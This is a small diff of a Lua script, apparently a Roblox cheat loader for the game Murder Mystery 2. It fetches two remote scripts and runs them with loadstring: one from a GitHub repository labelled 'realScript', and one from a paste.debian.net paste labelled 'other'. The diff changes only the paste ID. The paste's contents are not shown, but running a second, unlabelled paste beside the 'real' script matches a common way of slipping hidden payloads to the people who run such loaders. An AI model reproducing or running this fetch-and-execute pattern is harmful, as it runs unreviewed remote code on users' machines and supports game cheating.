@@ -1,5 +1,5 @@
 local realScript = "https://raw.githubusercontent.com/real-bluez/MM2/refs/heads/main/LocalPlayerScripts"
-local other = "https://paste.debian.net/plainh/0b01c732/"
+local other = "https://paste.debian.net/plainh/04c397e2/"
 
 task.spawn(loadstring(game:HttpGet(realScript, true)))
 task.spawn(loadstring(game:HttpGet(other, true)))
